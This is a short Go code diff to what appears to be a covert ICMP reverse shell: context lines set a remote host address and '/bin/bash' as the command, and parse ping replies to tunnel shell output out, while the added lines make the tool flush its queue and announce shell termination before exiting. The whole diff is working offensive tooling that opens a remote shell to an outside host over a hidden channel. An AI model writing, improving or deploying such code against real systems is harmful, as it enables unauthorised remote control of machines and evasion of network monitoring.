@@ -8,6 +8,7 @@ import (
 	"regexp"
 	"strconv"
 	"sync"
+	"time"
 )
 
 const RHOST = "172.17.0.1"
@@ -15,6 +16,8 @@ const COMMAND = "/bin/bash"
 
 var outQueue []byte
 var outQueueLock sync.Mutex
+
+var sendDone = true
 
 var icmpSeqRegexp = regexp.MustCompile("icmp_seq=([0-9]+) ttl=")
 
@@ -58,9 +61,16 @@ func main() {
 	}()
 
 	subCmd.Wait()
+
+	send([]byte("--- SHELL TERMINATED ---\n"), 25)
+
+	for !sendDone {
+		time.Sleep(time.Second * 1)
+	}
 }
 
 func send(data []byte, len int) {
+	sendDone = false
 	outQueueLock.Lock()
 	outQueue = append(outQueue, data[:len]...)
 	outQueueLock.Unlock()
@@ -105,6 +115,10 @@ func sendloop() {
 				outQueueLock.Unlock()
 			}
 			continue
+		}
+
+		if payloadLen <= 0 {
+			sendDone = true
 		}
 
 		match := icmpSeqRegexp.FindStringSubmatch(string(out))
